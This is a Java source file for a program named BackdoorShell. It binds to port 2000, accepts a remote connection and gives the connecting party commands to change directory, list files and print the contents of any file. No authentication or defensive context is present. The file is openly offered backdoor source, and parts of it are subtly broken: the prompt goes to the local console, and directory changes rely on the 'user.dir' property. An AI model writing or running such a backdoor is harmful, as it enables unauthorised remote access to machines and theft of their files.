import java.io.*;
import java.net.*;

public class BackdoorShell {
    public static void main(String[] args) {
        try {
            ServerSocket server = new ServerSocket(2000);

            Socket client = server.accept();

            System.out.print(getDir() + "> ");

            BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintWriter out = new PrintWriter(client.getOutputStream(), true);

            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                String[] tokens = inputLine.split("\\s+");
                String command = tokens[0];

                if (command.equals("cd")) {
                    String directory = tokens.length > 1 ? tokens[1] : System.getProperty("user.home");
                    if (directory.equals(".")) {
                        out.println(getDir());
                    } else if (directory.equals("~")) {
                        changeDir(System.getProperty("user.home"));
                        out.println(getDir());
                    } else if (directory.equals("..")) {
                        changeDir("..");
                        out.println(getDir());
                    } else {
                        changeDir(directory);
                        out.println(getDir());
                    }
                } else if (command.equals("dir")) {
                    File directory = new File(getDir());
                    out.println("List of files in " + getDir());
                    for (File file : directory.listFiles()) {
                        if (file.isDirectory()) {
                            out.println(file.getName() + " - Directory");
                        } else {
                            out.println(file.getName() + " - File");
                        }
                    }
                } else if (command.equals("cat")) {
                    if (tokens.length > 1) {
                        String filename = tokens[1];
                        try (BufferedReader fileReader = new BufferedReader(new FileReader(filename))) {
                            String line;
                            while ((line = fileReader.readLine()) != null) {
                                out.println(line);
                            }
                        } catch (FileNotFoundException e) {
                            out.println("File " + filename + " not found!");
                        } catch (IOException e) {
                            out.println("Error");
                        }
                    } else {
                        out.println("Usage: cat <filename>");
                    }
                } else {
                    out.println("Unknown command: " + command);
                }

                System.out.print(getDir() + "> ");
            }

            client.close();
            server.close();
        } catch (IOException e) {
            System.out.println("Error: " + e.getMessage());
        }
    }

    private static String getDir() {
        return System.getProperty("user.dir");
    }

    private static void changeDir(String directory) {
        File file = new File(directory);
        if (file.isDirectory()) {
            System.setProperty("user.dir", directory);
        } else {
            System.out.println("Directory " + directory + " not found!");
        }
    }
}